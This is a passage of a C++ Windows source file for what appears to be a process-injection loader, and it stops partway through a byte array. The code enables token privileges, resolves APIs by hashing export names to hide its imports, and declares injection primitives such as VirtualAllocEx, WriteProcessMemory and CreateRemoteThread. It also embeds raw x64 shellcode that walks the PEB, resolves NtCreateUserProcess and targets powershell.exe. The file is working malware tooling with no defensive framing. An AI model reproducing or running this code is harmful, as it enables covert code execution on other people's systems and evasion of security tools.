#include <iostream>
#include <stdio.h>
#include <windows.h>

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

// Function prototypes for dynamic function resolution
using customOpenProcess = HANDLE(WINAPI*)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

using customVirtualAllocEx = LPVOID(WINAPI*)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

using customWriteProcessMemory = BOOL(WINAPI*)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);

using customCreateRemoteThread = HANDLE(WINAPI*)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

/*** 
 * This algorithm has many hash collisions, 
 * not good for anything. 
 * ***/
// DWORD getHashFromString(char *string) 
// DWORD getHashFromString(const char *string)
// {
// 	size_t stringLength = strnlen_s(string, 50);
// 	DWORD hash = 0x35;
	
// 	for (size_t i = 0; i < stringLength; i++)
// 	{
// 		hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
// 	}
// 	// printf("%s: 0x00%x\n", string, hash);
	
// 	return hash;
// }

// 64-bit FNV-1a hash
class ImprovedHash {
public:
    uint64_t computeHash(const char* input, size_t length) {
        uint64_t hash = 0xcbf29ce484222325; // 64-bit initial value, FNV_offset_basis
        uint64_t prime = 0x100000001b3;     // 64-bit prime, FNV_prime value

        for (size_t i = 0; i < length; ++i) {
            uint8_t value = input[i];
            hash ^= value;
            hash *= prime;
        }

        // Finalization steps
        hash ^= hash >> 33;
        hash *= 0xff51afd7ed558ccd;
        hash ^= hash >> 33;
        hash *= 0xc4ceb9fe1a85ec53;
        hash ^= hash >> 33;

        return hash;
    }
};

ImprovedHash hasher;
// DWORD getHashFromString(char *string) {
DWORD getHashFromString(const char *string) {
    size_t stringLength = strnlen_s(string, 50);
    return hasher.computeHash(string, stringLength);
}

PDWORD getFunctionAddressByHash(char *library, DWORD hash)
{
	PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
	
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
	
	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORD functionNameHash = getHashFromString(functionName);
		
		// If hash for API function is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			printf("[*] function name:%s hash: 0x%x RVA: %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}


unsigned char magiccode[] =
{
0x40,0x55,0x57,0x48,0x81,0xec,0x78,0x05,0x00,0x00,
0x48,0x8d,0x6c,0x24,0x60,0x65,0x48,0x8b,0x04,0x25,
0x60,0x00,0x00,0x00,0x48,0x89,0x45,0x00,0x48,0x8b,
0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x89,0x45,0x08,
0x48,0x8b,0x45,0x08,0xc6,0x40,0x48,0x00,0x48,0x8b,
0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x83,0xc0,0x20,
0x48,0x89,0x85,0xb0,0x02,0x00,0x00,0x48,0x8b,0x85,
0xb0,0x02,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,
0xb8,0x02,0x00,0x00,0x48,0xb8,0x6b,0x00,0x65,0x00,
0x72,0x00,0x6e,0x00,0x48,0x89,0x45,0x38,0x48,0xb8,
0x65,0x00,0x6c,0x00,0x33,0x00,0x32,0x00,0x48,0x89,
0x45,0x40,0x48,0xb8,0x2e,0x00,0x64,0x00,0x6c,0x00,
0x6c,0x00,0x48,0x89,0x45,0x48,0x48,0xc7,0x45,0x50,
0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0xd0,0x02,0x00,
0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0xb0,0x02,
0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0xb8,0x02,
0x00,0x00,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,
0x83,0xe8,0x10,0x48,0x89,0x85,0xd8,0x02,0x00,0x00,
0xc7,0x85,0xe0,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
0x48,0x8b,0x85,0xd8,0x02,0x00,0x00,0x48,0x8b,0x40,
0x60,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,0x48,0x8d,
0x45,0x38,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0xc7,
0x85,0xe0,0x02,0x00,0x00,0x01,0x00,0x00,0x00,0x48,
0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,0x00,0x85,
0xc0,0x75,0x0f,0xc7,0x85,0xe0,0x02,0x00,0x00,0x00,
0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,0x8b,
0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,0x85,
0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,
0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,0x7e,
0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,
0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,0xeb,0x46,
0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,0xf8,0x41,
0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,
0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,0x02,0x00,
0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,0x00,0x00,
0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,0x00,0x88,
0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,0x85,0xe5,
0x02,0x00,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,
0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,0x00,
0x88,0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc0,
0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,
0x0f,0xb7,0x00,0x66,0x89,0x85,0xec,0x02,0x00,0x00,
0xeb,0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,
0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,
0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,
0x02,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,
0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,
0x00,0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,
0x85,0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xec,0x02,
0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x48,
0x83,0xc0,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,
0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,0xc0,
0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb7,
0x85,0xe8,0x02,0x00,0x00,0x0f,0xb7,0x8d,0xec,0x02,
0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,0xff,
0x83,0xbd,0xe0,0x02,0x00,0x00,0x00,0x0f,0x84,0x2e,
0x01,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,
0xe8,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x48,
0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,
0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,
0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,
0xb7,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,0xeb,
0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,0xf8,
0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,
0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,0x02,
0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,0x00,
0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,0x00,
0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,0x85,
0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,
0x00,0x88,0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,
0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,
0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0xec,0x02,0x00,
0x00,0xeb,0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,
0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,
0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
0xe4,0x02,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,
0x02,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,
0x00,0x00,0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,
0xbe,0x85,0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xec,
0x02,0x00,0x00,0x0f,0xb7,0x85,0xe8,0x02,0x00,0x00,
0x0f,0xb7,0x8d,0xec,0x02,0x00,0x00,0x2b,0xc1,0x89,
0x85,0xe0,0x02,0x00,0x00,0x83,0xbd,0xe0,0x02,0x00,
0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0xd8,0x02,0x00,
0x00,0x48,0x89,0x85,0xd0,0x02,0x00,0x00,0xeb,0x25,
0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,0x00,
0x48,0x89,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,0x85,
0xb0,0x02,0x00,0x00,0x48,0x39,0x85,0xb8,0x02,0x00,
0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,0x85,
0xd0,0x02,0x00,0x00,0x48,0x89,0x85,0xf0,0x02,0x00,
0x00,0x48,0xb8,0x6e,0x00,0x74,0x00,0x64,0x00,0x6c,
0x00,0x48,0x89,0x45,0x38,0x48,0xb8,0x6c,0x00,0x2e,
0x00,0x64,0x00,0x6c,0x00,0x48,0x89,0x45,0x40,0x48,
0xc7,0x45,0x48,0x6c,0x00,0x00,0x00,0x48,0xc7,0x45,
0x50,0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0xf8,0x02,
0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0xb0,
0x02,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0xb8,
0x02,0x00,0x00,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,
0x48,0x83,0xe8,0x10,0x48,0x89,0x85,0x00,0x03,0x00,
0x00,0xc7,0x85,0x08,0x03,0x00,0x00,0x00,0x00,0x00,
0x00,0x48,0x8b,0x85,0x00,0x03,0x00,0x00,0x48,0x8b,
0x40,0x60,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,0x48,
0x8d,0x45,0x38,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,
0xc7,0x85,0x08,0x03,0x00,0x00,0x01,0x00,0x00,0x00,
0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,0x00,
0x85,0xc0,0x75,0x0f,0xc7,0x85,0x08,0x03,0x00,0x00,
0x00,0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,
0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,
0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,
0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,
0xb7,0x00,0x66,0x89,0x85,0x10,0x03,0x00,0x00,0xeb,
0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,0x83,0xf8,
0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,
0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x0c,0x03,
0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,0x03,0x00,
0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,0x00,0x00,
0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,0xbe,0x85,
0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x10,0x03,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,
0x00,0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,
0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,
0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x14,0x03,0x00,
0x00,0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,
0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,
0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
0x0c,0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,
0x03,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,
0x00,0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,
0xbe,0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x14,
0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
0x48,0x83,0xc0,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,
0xc0,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x0f,
0xb7,0x85,0x10,0x03,0x00,0x00,0x0f,0xb7,0x8d,0x14,
0x03,0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,
0xff,0x83,0xbd,0x08,0x03,0x00,0x00,0x00,0x0f,0x84,
0x2e,0x01,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,
0x00,0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0xc8,0x02,
0x00,0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,
0x83,0xe8,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,
0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,
0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,
0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
0x00,0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
0x0f,0xb7,0x00,0x66,0x89,0x85,0x10,0x03,0x00,0x00,
0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,0x83,
0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,0x00,
0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x0c,
0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,0x03,
0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,0x00,
0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,0xbe,
0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x10,0x03,
0x00,0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,
0xb6,0x00,0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,
0x85,0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,
0x00,0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,
0x00,0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x14,0x03,
0x00,0x00,0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,
0x00,0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,
0x03,0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,
0x85,0x0c,0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,
0x0d,0x03,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,
0x03,0x00,0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,
0x0f,0xbe,0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,
0x14,0x03,0x00,0x00,0x0f,0xb7,0x85,0x10,0x03,0x00,
0x00,0x0f,0xb7,0x8d,0x14,0x03,0x00,0x00,0x2b,0xc1,
0x89,0x85,0x08,0x03,0x00,0x00,0x83,0xbd,0x08,0x03,
0x00,0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0x00,0x03,
0x00,0x00,0x48,0x89,0x85,0xf8,0x02,0x00,0x00,0xeb,
0x25,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,
0x00,0x48,0x89,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,
0x85,0xb0,0x02,0x00,0x00,0x48,0x39,0x85,0xb8,0x02,
0x00,0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,
0x85,0xd0,0x02,0x00,0x00,0x48,0x8b,0x40,0x30,0x48,
0x89,0x85,0x18,0x03,0x00,0x00,0x48,0x8b,0x85,0x18,
0x03,0x00,0x00,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8d,
0x18,0x03,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,
0x48,0x89,0x85,0x20,0x03,0x00,0x00,0xb8,0x08,0x00,
0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,0x20,
0x03,0x00,0x00,0x8b,0x84,0x01,0x88,0x00,0x00,0x00,
0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,0x03,0xc8,
0x48,0x8b,0xc1,0x48,0x89,0x85,0x28,0x03,0x00,0x00,
0x48,0x8b,0x85,0x28,0x03,0x00,0x00,0x8b,0x40,0x20,
0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,0x03,0xc8,
0x48,0x8b,0xc1,0x48,0x89,0x85,0x30,0x03,0x00,0x00,
0x48,0xb8,0x47,0x65,0x74,0x50,0x72,0x6f,0x63,0x41,
0x48,0x89,0x45,0x10,0xc7,0x85,0x38,0x03,0x00,0x00,
0x00,0x00,0x00,0x00,0x48,0x63,0x85,0x38,0x03,0x00,
0x00,0x48,0x8b,0x8d,0x30,0x03,0x00,0x00,0x48,0x63,
0x04,0x81,0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,
0x8b,0x55,0x10,0x48,0x39,0x14,0x01,0x74,0x10,0x8b,
0x85,0x38,0x03,0x00,0x00,0xff,0xc0,0x89,0x85,0x38,
0x03,0x00,0x00,0xeb,0xcd,0x48,0x8b,0x85,0x28,0x03,
0x00,0x00,0x8b,0x40,0x24,0x48,0x8b,0x8d,0x18,0x03,
0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
0x85,0x40,0x03,0x00,0x00,0x48,0x8b,0x85,0x28,0x03,
0x00,0x00,0x8b,0x40,0x1c,0x48,0x8b,0x8d,0x18,0x03,
0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
0x85,0x48,0x03,0x00,0x00,0x48,0x63,0x85,0x38,0x03,
0x00,0x00,0x48,0x8b,0x8d,0x40,0x03,0x00,0x00,0x48,
0x0f,0xbf,0x04,0x41,0x48,0x8b,0x8d,0x48,0x03,0x00,
0x00,0x48,0x63,0x04,0x81,0x48,0x8b,0x8d,0x18,0x03,
0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
0x85,0x50,0x03,0x00,0x00,0x48,0x8b,0x85,0x18,0x03,
0x00,0x00,0x48,0x89,0x85,0x58,0x03,0x00,0x00,0x48,
0x8b,0x85,0xf8,0x02,0x00,0x00,0x48,0x89,0x85,0x60,
0x03,0x00,0x00,0x48,0x8b,0x85,0x60,0x03,0x00,0x00,
0xc7,0x80,0x14,0x01,0x00,0x00,0xff,0xff,0xff,0xff,
0x48,0x8b,0x85,0xf8,0x02,0x00,0x00,0x48,0x8b,0x40,
0x30,0x48,0x89,0x85,0x68,0x03,0x00,0x00,0x48,0xb8,
0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x48,0x89,
0x45,0x10,0x48,0xc7,0x45,0x18,0x61,0x72,0x79,0x41,
0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0x58,0x03,0x00,
0x00,0xff,0x95,0x50,0x03,0x00,0x00,0x48,0x89,0x85,
0x70,0x03,0x00,0x00,0x48,0xb8,0x52,0x74,0x6c,0x41,
0x6c,0x6c,0x6f,0x63,0x48,0x89,0x45,0x10,0x48,0xb8,
0x61,0x74,0x65,0x48,0x65,0x61,0x70,0x00,0x48,0x89,
0x45,0x18,0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0x68,
0x03,0x00,0x00,0xff,0x95,0x50,0x03,0x00,0x00,0x48,
0x89,0x85,0x78,0x03,0x00,0x00,0x48,0xb8,0x52,0x74,
0x6c,0x43,0x72,0x65,0x61,0x74,0x48,0x89,0x45,0x38,
0x48,0xb8,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,
0x48,0x89,0x45,0x40,0x48,0xb8,0x50,0x61,0x72,0x61,
0x6d,0x65,0x74,0x65,0x48,0x89,0x45,0x48,0x48,0xc7,
0x45,0x50,0x72,0x73,0x45,0x78,0x48,0x8d,0x55,0x38,
0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
0x03,0x00,0x00,0x48,0x89,0x85,0x80,0x03,0x00,0x00,
0x48,0xb8,0x4e,0x74,0x43,0x72,0x65,0x61,0x74,0x65,
0x48,0x89,0x45,0x20,0x48,0xb8,0x55,0x73,0x65,0x72,
0x50,0x72,0x6f,0x63,0x48,0x89,0x45,0x28,0x48,0xc7,
0x45,0x30,0x65,0x73,0x73,0x00,0x48,0x8d,0x55,0x20,
0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
0x03,0x00,0x00,0x48,0x89,0x85,0x88,0x03,0x00,0x00,
0x48,0xb8,0x52,0x74,0x6c,0x49,0x6e,0x69,0x74,0x55,
0x48,0x89,0x45,0x20,0x48,0xb8,0x6e,0x69,0x63,0x6f,
0x64,0x65,0x53,0x74,0x48,0x89,0x45,0x28,0x48,0xc7,
0x45,0x30,0x72,0x69,0x6e,0x67,0x48,0x8d,0x55,0x20,
0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
0x03,0x00,0x00,0x48,0x89,0x85,0x90,0x03,0x00,0x00,
0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,0x00,
0x48,0x89,0x45,0x60,0x48,0xb8,0x43,0x00,0x3a,0x00,
0x5c,0x00,0x57,0x00,0x48,0x89,0x45,0x68,0x48,0xb8,
0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x48,0x89,
0x45,0x70,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
0x53,0x00,0x48,0x89,0x45,0x78,0x48,0xb8,0x79,0x00,
0x73,0x00,0x74,0x00,0x65,0x00,0x48,0x89,0x85,0x80,
0x00,0x00,0x00,0x48,0xb8,0x6d,0x00,0x33,0x00,0x32,
0x00,0x5c,0x00,0x48,0x89,0x85,0x88,0x00,0x00,0x00,
0x48,0xb8,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,
0x48,0x89,0x85,0x90,0x00,0x00,0x00,0x48,0xb8,0x6f,
0x00,0x77,0x00,0x73,0x00,0x50,0x00,0x48,0x89,0x85,
0x98,0x00,0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,0x00,
0x65,0x00,0x72,0x00,0x48,0x89,0x85,0xa0,0x00,0x00,
0x00,0x48,0xb8,0x53,0x00,0x68,0x00,0x65,0x00,0x6c,
0x00,0x48,0x89,0x85,0xa8,0x00,0x00,0x00,0x48,0xb8,
0x6c,0x00,0x5c,0x00,0x76,0x00,0x31,0x00,0x48,0x89,
0x85,0xb0,0x00,0x00,0x00,0x48,0xb8,0x2e,0x00,0x30,
0x00,0x5c,0x00,0x70,0x00,0x48,0x89,0x85,0xb8,0x00,
0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,0x00,0x65,0x00,
0x72,0x00,0x48,0x89,0x85,0xc0,0x00,0x00,0x00,0x48,
0xb8,0x73,0x00,0x68,0x00,0x65,0x00,0x6c,0x00,0x48,
0x89,0x85,0xc8,0x00,0x00,0x00,0x48,0xb8,0x6c,0x00,
0x2e,0x00,0x65,0x00,0x78,0x00,0x48,0x89,0x85,0xd0,
0x00,0x00,0x00,0x48,0xc7,0x85,0xd8,0x00,0x00,0x00,
0x65,0x00,0x00,0x00,0x48,0x8d,0x55,0x60,0x48,0x8d,
